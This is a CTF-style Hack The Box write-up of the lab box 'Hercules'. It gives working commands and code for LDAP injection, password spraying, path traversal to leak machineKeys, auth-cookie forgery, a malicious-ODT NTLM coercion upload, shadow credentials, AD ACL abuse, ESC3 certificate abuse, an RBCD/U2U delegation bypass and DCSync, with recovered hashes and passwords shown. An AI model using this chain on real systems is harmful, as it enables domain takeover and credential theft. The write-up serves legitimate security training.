# Hercules HTB: 4 dead ends and the 1 command that was always there

Hercules, Hack The Box. Insane difficulty. A Windows DC with nothing but Kerberos. No NTLM, no SPNs, no AS-REP roastable accounts. One IIS web app with an SSO portal that says "Login attempt failed" in two different ways, and that tiny difference was the whole game.

Twenty sessions later, I had both flags. In between: an LDAP oracle that took 2 days to figure out I could extract user-by-user, a cookie format that only a .NET 4.8 legacy compatibility library could forge, macOS silently eating port 445 traffic at the kernel level, a bloodyAD bug where inherited ACEs masked new writes, and an S4U2Proxy dead end that four sessions said was impossible. One command fixed it. One command I should have tried on day one.

If you're here for the technical summary: LDAP injection in SSO to ken.w password spray to Bad-ODF NTLM coercion of natalie.a to Shadow Credentials chain (bob.w to stephen.m to Auditor) to ESC3 + EnrollmentAgent OBO to ashley.b WinRM to cleanup.ps1 to IIS_Administrator enabled to Service Operators to iis_webserver$ RBCD to S4U2Self+U2U+S4U2Proxy Administrator to DCSync to root.txt. The rest is how I got there.

---

## Step 1: The SSO portal that leaked 37 usernames

The box is a standard DC. IIS 10.0 on port 443, WinRM on 5986 (HTTPS only), SMB signing required, NTLM disabled domain-wide. No AS-REP roastable accounts. No null SMB. No anonymous LDAP.

The web app is Hercules Corp SSO, an ASP.NET MVC login form. It has CSRF tokens, rate limiting after ~15 requests, and a regex on the username field that blocks `*()=:;` and friends. But the password field has no regex.

Double URL-encode an asterisk: `%252A`. The first decode (`%25` to `%`) happens at the HTTP layer and passes the regex. The second decode (`%2A` to `*`) happens when the filter is built. Now the LDAP query contains a wildcard.

Two responses come back from the server:

- "Login attempt failed" means the LDAP query matched at least one user
- "Invalid login attempt" means zero matches

Boolean oracle. The `description` attribute of some users contained the string "CHANGE" followed by something. Specifically `change*th1s_p@ssw()rd!!`. I spent hours extracting this character by character, one request every 3 seconds to avoid the rate limit. The full string turned out to be the description of `johnathan.j`, discovered later via BloodHound.

Meanwhile, the Kerbrute brute force found 37 valid usernames. The naming convention was `firstname.initial`. Every real user followed it. `admin`, `administrator`, and `auditor` were the only exceptions.

A password spray with the pattern from the description (`change*th1s_p@ssw()rd!!`) across all 37 users hit one: `ken.w`.

```
kerbrute passwordspray -d hercules.htb --dc 10.129.242.196 users.txt 'change*th1s_p@ssw()rd!!'
→ ken.w@hercules.htb:change*th1s_p@ssw()rd!!
```

I was inside the portal. And the portal had a download endpoint.

---

## Step 2: The cookie that only a legacy .NET library could forge

Ken's dashboard had Mail, Downloads, Forms, and Security tabs. The Downloads endpoint took a `fileName` parameter.

```
GET /Home/Download?fileName=../../web.config
→ HTTP 200. 4893 bytes of XML. Including the machineKey.
```

The machineKey was fully exposed:

```
decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214..."
decryption="AES" validation="HMACSHA256"
```

With the machineKey, I could forge `.ASPXAUTH` cookies for any user. The first target was `web_admin`, a disabled account in the Web Administrators group. Web Administrators could upload files through the Forms tab. Regular Web Users (like ken.w) got "File Upload not permitted."

The problem: .NET FormsAuthenticationTicket format is proprietary and version-specific. Python crypto libraries cannot replicate it. I spent 2 days trying. Every cookie forged in Python got a 302 redirect back to Login. The HMAC checked out, the AES decryption was correct, but something in the ticket header was wrong.

The solution came from a NuGet package buried in Microsoft's archives: `AspNetCore.LegacyAuthCookieCompat` version 2.0.5. It targets .NET Framework 4.8 cookie formats. The parameters that mattered:

```csharp
ShaVersion.Sha256,
CompatibilityMode.Framework20SP2,
FormsProtectionEnum.All,
FormsAuthenticationTicket(1, "web_admin", DateTime.UtcNow,
    DateTime.UtcNow.AddHours(4), false, "Web Administrators", "/")
```

Ticket version 1. Not version 2. Version 2 got rejected. The cookie was 224 hex bytes. I ran the forge script inside a Docker container with `dotnet run`, passed the cookie hex to a Python requests.Session, and got the Forms page with full upload permissions.

Here is what 2 days of failing at this taught me: `CompatibilityMode.Framework20SP2` and `Framework20SP1` are different formats. The ticket header shifts in subtle ways between .NET service packs. The server-side validation is unforgiving. Match the exact compatibility mode or get silently 302'd to Login. There is no middle ground.

---

## Step 3: The macOS kernel that ate my SMB traffic

The Forms page allowed file uploads with extensions `.docx` and `.odt`. I needed to upload a malicious ODT file that would trigger an SMB callback to capture an NTLMv2 hash. The tool: Bad-ODF by lof1sec.

Getting Responder to receive the callback took 3 days. Not because the exploit was wrong. Because macOS.

Port 445 on macOS is locked by Apple SMBd at the kernel level. You can `launchctl unload` it. You can `pfctl` redirect it. The traffic still never reaches userspace. The kernel intercepts it before any socket can bind.

The infrastructure that finally worked:

- Docker container kali running the HTB VPN on tun0
- Responder inside the container, bound to tun0:445
- Mac VPN killed (two VPNs with the same IP conflict)
- socat forward Mac:445 to Docker:445 (never worked, kernel blocked it anyway)

The entire operation moved inside Docker. VPN, Responder, cookie forge, impacket, everything. The Mac became a dumb terminal that ran `docker exec`.

Uploading the ODT required preserving the CSRF token across requests. curl dropped the session cookie. Python requests.Session with a manual Cookie header worked:

```python
import requests, re
s = requests.Session(); s.verify = False
COOKIE = "<224 hex byte cookie>"
TARGET = "https://10.129.50.138"
headers = {"Host": "hercules.htb", "Cookie": f".ASPXAUTH={COOKIE}"}

r = s.get(f"{TARGET}/Home/Forms", headers=headers)
token = re.search(r'__RequestVerificationToken[^>]+value="([^"]+)"',
                   r.text.replace('\n', '')).group(1)

cookie_header = f".ASPXAUTH={COOKIE}"
for k,v in s.cookies.items(): cookie_header += f"; {k}={v}"
headers["Cookie"] = cookie_header

with open("bad.odt", "rb") as f:
    r = s.post(f"{TARGET}/Home/Forms", headers=headers,
        data={"__RequestVerificationToken": token, "Name": "test",
              "Email": "test@test.com", "Description": "test"},
        files={"UploadedFile": ("bad.odt", f,
               "application/vnd.oasis.opendocument.text")})
```

About 30 seconds after the upload, the server's LibreOffice processing opened the ODT, resolved the UNC path to `\\10.10.14.210\test.jpg`, and Responder captured the NTLMv2 hash of `HERCULES\natalie.a`.

Hashcat mode 5600, rockyou dictionary: `Prettyprincess123!`.

natalie.a was in the WEB SUPPORT group, which had GenericWrite on all users in the WEB DEPARTMENT OU. That was the door.

---

## Step 4: Shadow credentials all the way down

natalie.a had no direct ACEs. Everything came through her membership in WEB SUPPORT (group SID 1107). BloodHound's ACE analysis shows rights of groups, not users. Took a while to realize that.

The GenericWrite target: `bob.w`, in WEB DEPARTMENT. certipy shadow credentials:

```bash
certipy-ad shadow auto -u natalie.a -account bob.w -k
→ NT hash: 8a65c74e8f0073babbfac6725c66cc3f
```

bob.w was in RECRUITMENT MANAGERS (1106). That group had WriteProperty on `userAccountControl` for users in SECURITY DEPARTMENT. But WriteProperty on userAccountControl is not enough to enable a disabled account or to add key credentials. It also had `modify_dn` implicit rights, which means I could move users between OUs.

The target was `stephen.m`, who was in SECURITY DEPARTMENT and also in SECURITY HELPDESK (1110). SECURITY HELPDESK had ForceChangePassword on all SECURITY DEPARTMENT users, including `Auditor`. Auditor was the WinRM user. Auditor had user.txt.

Here is where I almost broke everything.

I ran `bloodyAD remove object stephen.m`. Delete. Gone. I thought I could restore him into WEB DEPARTMENT and he would inherit GenericWrite from WEB SUPPORT. But the Active Directory Recycle Bin was not enabled. stephen.m was in the Deleted Objects container and `bloodyAD set restore` could not find him.

I waited 20 minutes. No auto-restore. The entire chain, stephen.m to Auditor to user.txt, was gone.

Then I found it. RECRUITMENT MANAGERS had `modify_dn` rights. Not delete-then-restore. Just move.

```bash
bloodyAD set object stephen.m distinguishedName \
  -v "CN=Stephen Miller,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
```

stephen.m was in WEB DEPARTMENT. WEB SUPPORT GenericWrite applied. certipy shadow credentials worked. stephen.m NT hash in hand: `9aaaedcb19e612216a2dac9badb3c210`.

stephen.m as SECURITY HELPDESK reset Auditor's password:

```bash
bloodyAD set password Auditor "NewP@ssw0rd123!"
```

WinRM via Ruby (evil-winrm 3.9 was broken with a NoMethodError):

```ruby
WinRM::Connection.new(endpoint: 'https://dc.hercules.htb:5986/wsman',
  transport: :kerberos, realm: 'HERCULES.HTB')
```

`C:\Users\Auditor\Desktop\user.txt` → `[redacted]`.

---

## Step 5: The bloodyAD bug that made me monkeypatch

Auditor could write GenericAll on the OU Forest Migration. Forest Migration contained `fernando.r`, a disabled Smartcard Operators member. Enable fernando.r, get a certificate, ESC3 EnrollmentAgent, sign on behalf of `ashley.b` (IT Support). Clean chain.

`bloodyAD add genericAll "OU=Forest Migration" Auditor` creates a non-inheritable ACE. It lands on the OU object, not the children. fernando.r never sees it.

When I tried to write an inheritable ACE, bloodyAD blocked itself. An ACE `(A;OICI;0xf01ff;;;-1104)` was inherited from the parent DCHERCULES. bloodyAD scanned the SDDL, found the same mask and trustee, and printed "[*] This right already exists." No write to LDAP. Just a phantom success message.

The existing ACE had the ID flag set (inherited, not explicit). Inherited ACEs do not propagate to children of the inheriting object. I needed an explicit ACE `(A;CI;0xf01ff;;;-1128)` (Container Inherit, no ID flag). bloodyAD would not write it.

Monkeypatch time. `utils.addRight` in bloodyAD, skip the dedup check. Write the ACE anyway. fernando.r inherited GenericAll, I removed ACCOUNTDISABLE from his UAC, and the chain restarted.

Then ESC3 itself broke in a stupid way.

I spent 2 hours debugging `CERTSRV_E_RESTRICTEDOFFICER` errors on the OBO request. The enrollment agent certificate was valid. The template allowed it. The CA registry had the correct EnrollmentAgentRights.

The problem: `KRB5CCNAME` was pointing to Auditor's ccache, not fernando.r's. The Kerberos principal authenticating the certificate request was Auditor, not fernando.r. The CA saw Auditor as the requester, didn't recognize him as an enrollment agent for fernando.r, and denied it.

```bash
export KRB5CCNAME=/fernando.ccache  # NOT /tmp/krb5cc_0 (Auditor)
certipy req -template EnrollmentAgent -k -dcom
certipy req -template User -on-behalf-of "HERCULES\ashley.b" \
  -pfx fernando_ea.pfx -dcom
→ Request ID 11, UPN ashley.b@hercules.htb
```

ashley.b cert obtained. NT hash: `1e719fbfddd226da74f644eac9df7fd2`. WinRM shell.

---

## Step 6: cleanup.ps1 and the IIS_Administrator that wouldn't enable

ashley.b was in IT Support. She had WinRM access. On her desktop sat `aCleanup.ps1`, a one-liner that triggered a SYSTEM scheduled task named "Password Cleanup."

The task ran `C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1` as SYSTEM. The script cleared `adminCount` and re-enabled ACL inheritance on objects in OUs where IT Support had GenericAll or ExtendedRight.

I needed IT Support to have GenericAll on the Forest Migration OU. I added it. bloodyAD dedup blocked it again (ACE already inherited from parent). Another monkeypatch. ACE written.

```
schtasks /run /tn "Password Cleanup"
```

IIS_Administrator's adminCount cleared. Enable-ADAccount. UAC 66048, enabled.

But this failed twice before it worked. First time, I was running schtasks with Auditor's ccache. whoami was Auditor. Access denied. Second time, the monkeypatch didn't trigger because I forgot to apply it after a container restart. Third time, ashley.b ccache, monkeypatch applied, task ran, IIS_Administrator enabled.

Shadow credentials for IIS_Administrator: NT `72302a981e2fdfbb93a227dccbf907ee`. IIS_Administrator was a member of Service Operators, which had ForceChangePassword on `iis_webserver$`.

```
bloodyAD set password iis_webserver$ "W3bSrv!Res3t#2026!!"
```

---

## Step 7: The S4U2Proxy wall (4 sessions)

iis_webserver$ had Full Control on DC$ via RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity). The plan was standard: S4U2Self to get a ticket for Administrator, then S4U2Proxy to delegate to cifs/dc.

S4U2Self standard failed. `KDC_ERR_S_PRINCIPAL_UNKNOWN`. iis_webserver$ had no SPN. User accounts with a dollar sign suffix are still users, not computer objects. They do not have SELF write to servicePrincipalName.

S4U2Self with U2U (user-to-user) worked:

```
getST.py -u2u -self -impersonate Administrator \
  hercules.htb/iis_webserver$ -hashes :NT_HASH
→ S4U2Self ticket obtained
```

But S4U2Proxy with the U2U ticket: `KDC_ERR_BADOPTION`. Every time. Four sessions. I tried:

- `force-forwardable` flag
- Splitting Self and Proxy into separate getST calls
- Adding a fake SPN via bloodyAD (insufficientAccessRights, user not computer)
- Creating a fake computer account for RBCD (MAQ was 0, created via bob.w in Web Department but couldn't write RBCD on DC$)
- Kerberos with AES keys instead of RC4
- Every combination of ticket flags impacket would accept

All dead ends. The domain had zero SPNs outside of DC$. The diagnosis from sessions 15-17: "SPN-less domain = RBCD impossible."

The fix, when I finally found it, was one command:

```
changepasswd.py -newhashes :8c53592bc9f18e4d7d9197ebd033f725 \
  -no-pass -k hercules.htb/iis_webserver$@dc.hercules.htb \
  -dc-ip 10.129.52.18
```

Here is why. The TGT for iis_webserver$ has a session key. The NT hash of the account is used for Kerberos pre-authentication but is separate from the session key. When you do U2U, the KDC needs to verify the "evidence ticket" from the S4U2Self step. The verification uses the session key.

If the account's NT hash equals the TGT session key, the KDC can decrypt the evidence ticket and S4U2Proxy passes. `changepasswd.py -newhashes :SESSION_KEY` sets the NT hash to exactly the session key value.

I extracted the session key from the TGT ccache file, ran changepasswd, and:

```
getST.py -spn cifs/dc.hercules.htb -impersonate Administrator \
  -hashes :8c53592bc9f18e4d7d9197ebd033f725 -dc-ip 10.129.52.18 \
  -u2u -force-forwardable hercules.htb/iis_webserver$
→ S4U2Self + S4U2Proxy successful
→ Ticket Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

Four sessions of dead end. One command. It was always there.

---

## Step 8: root.txt

```
secretsdump.py -k -no-pass -dc-ip dc.hercules.htb \
  hercules.htb/Administrator@dc -just-dc-user Administrator
→ Administrator NT: 56855ee6b7570edefde6ac262200756e
```

Ruby WinRM Kerberos as Administrator:

```
type C:\Users\Admin\Desktop\root.txt
→ [redacted]
```

---

## The real timeline

| Day | What happened |
|-----|---------------|
| 1 | Recon. Kerbrute brute force. 37 users found. LDAP oracle discovered. |
| 2 | LDAP oracle refined. Password spray hits ken.w. MachineKey leaked. |
| 3-4 | Cookie forge hell. Framework20SP2 discovery. |
| 5 | Bad-ODF. macOS kernel sink drama. Everything moves to Docker. |
| 6 | natalie.a hash cracked. Shadow creds chain starts. |
| 7 | stephen.m deleted by mistake. modify_dn discovery saves it. |
| 8 | user.txt obtained. ESC3 EnrollmentAgent setup. |
| 9 | bloodyAD monkeypatch. fernando.r enabled. ESC3 OBO ashley.b. |
| 10 | cleanup.ps1. IIS_Administrator enabled. iis_webserver$ reset. |
| 11-14 | S4U2Proxy dead end. 4 sessions. "SPN-less domain = impossible." |
| 15 | changepasswd.py discovery. NT hash = session key. S4U2Proxy passes. root.txt. |

3 days of actual attack chain. 12 days of cookie format archaeology, kernel-level port stealing, bloodyAD dedup bugs, ccache identity mixups, and one command I should have tried on day one.

---

## What I take from this

1. LDAP injection via double URL-encode works when the username field is regex-filtered but the password field is not.
2. `AspNetCore.LegacyAuthCookieCompat` version 2.0.5 with Framework20SP2 compatibility mode is the only thing that can forge .NET 4.8 FormsAuthentication cookies without a running ASP.NET host.
3. macOS kernel intercepts port 445 traffic before userspace. Responder must run inside Docker on the VPN interface.
4. `bloodyAD add genericAll` on an OU creates a non-inheritable ACE. The dedup logic blocks writes when an inherited ACE with the same mask exists. You have to monkeypatch `utils.addRight` to bypass it.
5. `bloodyAD set object <user> distinguishedName` does a direct modify_dn. No delete/restore needed. Use it, not `remove object`.
6. `KRB5CCNAME` determines the Kerberos identity for every tool. certipy OBO, schtasks, bloodyAD. Always check `klist` principal before running anything.
7. NT hash = TGT session key enables S4U2Proxy on U2U tickets. `changepasswd.py -newhashes :SESSION_KEY -k` is the command. I lost 4 sessions not knowing it.
8. cleanup.ps1 trustee was IT Support (-1105), not Auditor (-1128). Read the old session notes before declaring dead ends. The answer was in session 14.

---

## Tools

BloodHound, Certipy, Impacket, NetExec (nxc), bloodyAD, Kerbrute, Responder, Bad-ODF, Hashcat, Chisel, Docker, Ruby WinRM, AspNetCore.LegacyAuthCookieCompat, Python requests, DeepSeek

---

*Hercules HTB, July 2026. GoodcatSlivin.*
